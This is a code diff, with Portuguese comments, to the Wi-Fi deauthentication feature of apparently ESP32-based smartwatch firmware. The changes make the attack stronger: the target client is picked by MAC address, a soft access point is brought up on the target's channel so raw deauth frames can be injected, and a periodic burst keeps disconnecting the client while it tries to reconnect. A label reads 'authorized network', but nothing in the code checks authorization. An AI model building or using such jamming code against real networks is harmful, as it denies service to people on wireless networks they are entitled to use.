@@ -20,9 +20,11 @@ enum deauth_mode_t : uint8_t {
 
 #define DEAUTH_FRAMES_PER_HIT 16
 #define DEAUTH_MAX_STATIONS   32
+#define DEAUTH_AP_SSID        "leWatch-deauth"
+#define DEAUTH_AP_PASS        "leWatch123"
 
 static volatile deauth_mode_t s_mode = DEAUTH_MODE_IDLE;
-static volatile int s_stations_deauthed = 0;
+static volatile int s_deauth_frames = 0;
 static volatile uint32_t s_tx_ok = 0;
 static volatile uint32_t s_tx_fail = 0;
 #ifdef ARDUINO
@@ -32,6 +34,13 @@ static uint16_t s_selected_network = 0;
 static uint8_t s_station_macs[DEAUTH_MAX_STATIONS][6];
 static int8_t s_station_rssi[DEAUTH_MAX_STATIONS];
 static volatile uint8_t s_station_count = 0;
+
+// Alvo escolhido pelo MAC, nao pelo indice do dropdown: a lista muda ao vivo e
+// um indice guardado apontaria pra outro aparelho no clique.
+static uint8_t s_selected_station[6];
+static bool s_selected_station_valid = false;
+static uint8_t s_rendered_macs[DEAUTH_MAX_STATIONS][6];
+static uint8_t s_rendered_mac_count = 0;
 
 #ifdef ARDUINO
 static portMUX_TYPE s_station_lock = portMUX_INITIALIZER_UNLOCKED;
@@ -71,7 +80,6 @@ static lv_obj_t *s_devices_page = NULL;
 static lv_timer_t *s_status_timer = NULL;
 static bool s_scanning = false;
 static uint32_t s_scan_started_tick = 0;
-static uint8_t s_rendered_station_count = 0;
 static std::vector<wifi_scan_params_t> s_scan_list;
 
 static void deauth_attack_stop(void);
@@ -93,10 +101,12 @@ static void observed_stations_clear()
     portENTER_CRITICAL(&s_station_lock);
 #endif
     s_station_count = 0;
-    s_rendered_station_count = 0;
+    s_selected_station_valid = false;
+    memset(s_selected_station, 0, sizeof(s_selected_station));
 #ifdef ARDUINO
     portEXIT_CRITICAL(&s_station_lock);
 #endif
+    s_rendered_mac_count = 0;
 }
 
 static void observed_station_add(const uint8_t *mac, int8_t rssi)
@@ -104,6 +114,13 @@ static void observed_station_add(const uint8_t *mac, int8_t rssi)
     if (!mac_is_usable(mac)) {
         return;
     }
+#ifdef ARDUINO
+    // O proprio AP aparece como src/dest nos beacons e respostas; ele nao e
+    // alvo (o alvo e o cliente que esta associado a ele).
+    if (memcmp(mac, s_frame.sender, 6) == 0) {
+        return;
+    }
+#endif
 #ifdef ARDUINO
     portENTER_CRITICAL(&s_station_lock);
 #endif
@@ -176,6 +193,7 @@ static void deauth_tx()
             return;
         }
         s_tx_ok++;
+        s_deauth_frames++;
     }
 }
 
@@ -188,7 +206,6 @@ static void attack_selected_frame(const mac_hdr_t *hdr)
                                memcmp(hdr->dest, s_frame.sender, 6) == 0;
     if ((station_is_source || station_is_destination) && frame_belongs_to_ap) {
         deauth_tx();
-        s_stations_deauthed++;
     }
 }
 
@@ -237,39 +254,34 @@ static bool deauth_observer_start(uint16_t network_index)
     return true;
 }
 
-static bool deauth_prepare_selected(uint16_t device_index, uint16_t reason)
+static bool deauth_prepare_selected(const uint8_t station[6], uint16_t reason)
 {
-    if (s_selected_network >= s_scan_list.size()) {
-        return false;
-    }
-    uint8_t macs[DEAUTH_MAX_STATIONS][6];
-    int8_t rssis[DEAUTH_MAX_STATIONS];
-    uint8_t count = observed_stations_snapshot(macs, rssis);
-    if (device_index >= count) {
+    if (s_selected_network >= s_scan_list.size() || station == nullptr) {
         return false;
     }
 #ifdef ARDUINO
     const wifi_scan_params_t &ap = s_scan_list[s_selected_network];
     memcpy(s_frame.sender, ap.bssid, 6);
     memcpy(s_frame.access_point, ap.bssid, 6);
-    memcpy(s_frame.station, macs[device_index], 6);
+    memcpy(s_frame.station, station, 6);
     s_frame.reason = reason;
-    WiFi.softAP("leWatch-deauth", "leWatch123", ap.channel);
+    // Igual ao tesa-klebeband/ESP32-Deauther: o softAP no canal do alvo e o que
+    // da ao esp_wifi_80211_tx um WIFI_IF_AP valido pra injetar.
+    WiFi.softAP(DEAUTH_AP_SSID, DEAUTH_AP_PASS, ap.channel);
 #else
     LV_UNUSED(reason);
 #endif
     return true;
 }
 
-static bool deauth_attack_start(uint16_t device_index, uint16_t reason)
+static bool deauth_attack_start(const uint8_t station[6], uint16_t reason)
 {
     deauth_attack_stop();
-    if (!deauth_prepare_selected(device_index, reason)) {
+    if (!deauth_prepare_selected(station, reason)) {
         return false;
     }
 #ifdef ARDUINO
     const wifi_scan_params_t &ap = s_scan_list[s_selected_network];
-    WiFi.mode(WIFI_MODE_APSTA);
     esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
     s_frame.reason = reason;
     s_mode = DEAUTH_MODE_SINGLE;
@@ -278,7 +290,7 @@ static bool deauth_attack_start(uint16_t device_index, uint16_t reason)
     LV_UNUSED(reason);
     s_mode = DEAUTH_MODE_SINGLE;
 #endif
-    s_stations_deauthed = 0;
+    s_deauth_frames = 0;
     return true;
 }
 
@@ -286,6 +298,8 @@ static void deauth_attack_stop(void)
 {
 #ifdef ARDUINO
     esp_wifi_set_promiscuous(false);
+    // O AP de ataque nao pode ficar no ar depois do "Parar".
+    WiFi.softAPdisconnect(true);
 #endif
     hw_wifi_off();
     s_mode = DEAUTH_MODE_IDLE;
@@ -379,27 +393,45 @@ static void network_changed_cb(lv_event_t *e)
     observed_stations_clear();
 }
 
+// A lista muda ao vivo enquanto observa: reconstroi quando o conjunto de MACs
+// muda (nao so quando a contagem muda) e mantem o aparelho que o usuario
+// escolheu, em vez de jogar a selecao de volta no primeiro da lista.
 static void fill_device_dropdown()
 {
-    if (s_device_dd && lv_dropdown_is_open(s_device_dd)) {
+    if (!s_device_dd || lv_dropdown_is_open(s_device_dd)) {
         return;
     }
     uint8_t macs[DEAUTH_MAX_STATIONS][6];
     int8_t rssis[DEAUTH_MAX_STATIONS];
     uint8_t count = observed_stations_snapshot(macs, rssis);
-    if (count == s_rendered_station_count || !s_device_dd) {
+    if (count == s_rendered_mac_count &&
+        memcmp(macs, s_rendered_macs, (size_t)count * 6) == 0) {
         return;
     }
+    memcpy(s_rendered_macs, macs, (size_t)count * 6);
+    s_rendered_mac_count = count;
     lv_dropdown_clear_options(s_device_dd);
+    if (count == 0) {
+        s_selected_station_valid = false;
+        return;
+    }
+    int32_t restore = -1;
     for (uint8_t i = 0; i < count; i++) {
         char option[48];
         snprintf(option, sizeof(option), "%02X:%02X:%02X:%02X:%02X:%02X (%ddBm)",
                  macs[i][0], macs[i][1], macs[i][2], macs[i][3], macs[i][4], macs[i][5],
                  (int)rssis[i]);
         lv_dropdown_add_option(s_device_dd, option, i);
+        if (s_selected_station_valid && memcmp(macs[i], s_selected_station, 6) == 0) {
+            restore = i;
+        }
     }
-    lv_dropdown_set_selected(s_device_dd, 0);
-    s_rendered_station_count = count;
+    if (restore < 0) {
+        restore = 0;
+        memcpy(s_selected_station, macs[0], 6);
+        s_selected_station_valid = true;
+    }
+    lv_dropdown_set_selected(s_device_dd, (uint32_t)restore);
 }
 
 static void status_tick(lv_timer_t *t)
@@ -414,12 +446,15 @@ static void status_tick(lv_timer_t *t)
         const char *text = s_mode == DEAUTH_MODE_OBSERVE ? "Observando dispositivos..." :
                            s_mode == DEAUTH_MODE_SINGLE ? "Alvo ativo" : "Observador parado";
         lv_label_set_text_fmt(s_device_status, "%s\nDispositivos: %d\nFrames: %d", text,
-                              (int)s_station_count, (int)s_stations_deauthed);
+                              (int)s_station_count, (int)s_deauth_frames);
     }
 #ifdef ARDUINO
     if (s_mode == DEAUTH_MODE_SINGLE) {
-        Serial.printf("[deauth] stations=%d matches=%d tx_ok=%u tx_fail=%u last_err=%s\n",
-                      (int)s_station_count, (int)s_stations_deauthed,
+        // Rajada periodica: deauth tem que continuar batendo enquanto o cliente
+        // tenta reconectar. Esperar so pelo trafego deixava alvo parado intacto.
+        deauth_tx();
+        Serial.printf("[deauth] stations=%d frames=%d tx_ok=%u tx_fail=%u last_err=%s\n",
+                      (int)s_station_count, (int)s_deauth_frames,
                       (unsigned)s_tx_ok, (unsigned)s_tx_fail, esp_err_to_name(s_last_tx_err));
     }
 #endif
@@ -458,18 +493,33 @@ static uint16_t deauth_reason_from_index(uint16_t index)
 static void attack_device_cb(lv_event_t *e)
 {
     (void)e;
-    if (s_station_count == 0) {
+    if (!s_selected_station_valid || s_station_count == 0) {
         ui_msg_pop_up("Deauth", "Nenhum dispositivo observado");
         return;
     }
-    uint16_t device = lv_dropdown_get_selected(s_device_dd);
     uint16_t reason = deauth_reason_from_index(lv_dropdown_get_selected(s_reason_dd));
     kill_vpn_tunnel();
-    if (deauth_attack_start(device, reason)) {
-        ui_msg_pop_up("Deauth", "Alvo selecionado (rede autorizada)");
+    if (deauth_attack_start(s_selected_station, reason)) {
+        char msg[64];
+        snprintf(msg, sizeof(msg), "Deauth %02X:%02X:%02X:%02X:%02X:%02X (rede autorizada)",
+                 s_selected_station[0], s_selected_station[1], s_selected_station[2],
+                 s_selected_station[3], s_selected_station[4], s_selected_station[5]);
+        ui_msg_pop_up("Deauth", msg);
     } else {
         ui_msg_pop_up("Deauth", "Dispositivo invalido");
     }
+}
+
+// Guarda o MAC escolhido no dropdown (o indice muda quando a lista atualiza).
+static void device_changed_cb(lv_event_t *e)
+{
+    (void)e;
+    uint32_t index = lv_dropdown_get_selected(s_device_dd);
+    if (index >= s_rendered_mac_count) {
+        return;
+    }
+    memcpy(s_selected_station, s_rendered_macs[index], 6);
+    s_selected_station_valid = true;
 }
 
 static void back_event_handler(lv_event_t *e)
@@ -497,7 +547,7 @@ static void back_event_handler(lv_event_t *e)
 static void build_devices_page()
 {
     s_devices_page = lv_menu_page_create(s_menu, NULL);
-    s_device_dd = create_dropdown(s_devices_page, LV_SYMBOL_WIFI, "Dispositivo", "", 0, NULL);
+    s_device_dd = create_dropdown(s_devices_page, LV_SYMBOL_WIFI, "Dispositivo", "", 0, device_changed_cb);
     s_device_status = create_label(s_devices_page, LV_SYMBOL_LIST, "Status", "Observador parado");
     s_reason_dd = create_dropdown(s_devices_page, LV_SYMBOL_WARNING, "Motivo", DEAUTH_REASON_OPTIONS, 0, NULL);
     deauth_action_button(s_devices_page, LV_SYMBOL_STOP " Parar observador", stop_observer_cb);
